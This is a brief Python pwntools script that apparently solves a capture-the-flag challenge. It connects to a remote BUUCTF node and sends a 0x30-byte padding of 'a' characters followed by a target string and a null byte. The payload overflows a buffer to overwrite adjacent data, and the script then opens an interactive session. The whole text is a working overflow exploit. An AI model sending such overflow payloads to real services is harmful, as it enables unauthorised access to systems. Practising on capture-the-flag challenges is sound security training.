from pwn import *

p = remote('node4.buuoj.cn', 28806)
p.sendline('a' * 0x30 + 'n0t_r3@11y_f1@g\x00')
p.interactive()
